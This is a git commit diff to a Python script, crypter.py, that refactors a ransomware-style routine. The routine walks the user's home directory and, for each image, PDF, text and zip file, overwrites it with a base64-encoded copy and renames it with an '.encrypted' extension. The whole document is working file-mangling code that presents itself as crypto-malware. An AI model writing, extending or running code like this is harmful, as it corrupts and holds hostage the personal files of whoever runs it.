2821345c5b1195c5c99d8037c4dc75bde74b5cdf
Marcel Schwarz <marcel@icaotix.de>
2019-10-19 01:32:35 +0200

    Replace if with filter function
    filter function is faster than an if
    also removed whitespace

--- crypter.py
+++ crypter.py
@@ -6,13 +6,11 @@ home = os.path.expanduser("~")
 exts = (".jpg", ".pdf", ".png", ".txt", ".zip")
 
 for root, dirs, files in os.walk(home):
+    files = list(filter(lambda f: f.lower().endswith(exts), files))
     for file in files:
-        if file.lower().endswith(exts):
-            path = os.path.join(root, file)
-            with open(path, "rb") as f:
-                enc = base64.b64encode(f.read())
-
-            with open(path, "wb") as f:
-                f.write(enc)
-
-            os.rename(path, path + ".encrypted")
+        path = os.path.join(root, file)
+        with open(path, "rb") as f:
+            enc = base64.b64encode(f.read())
+        with open(path, "wb") as f:
+            f.write(enc)
+        os.rename(path, path + ".encrypted")
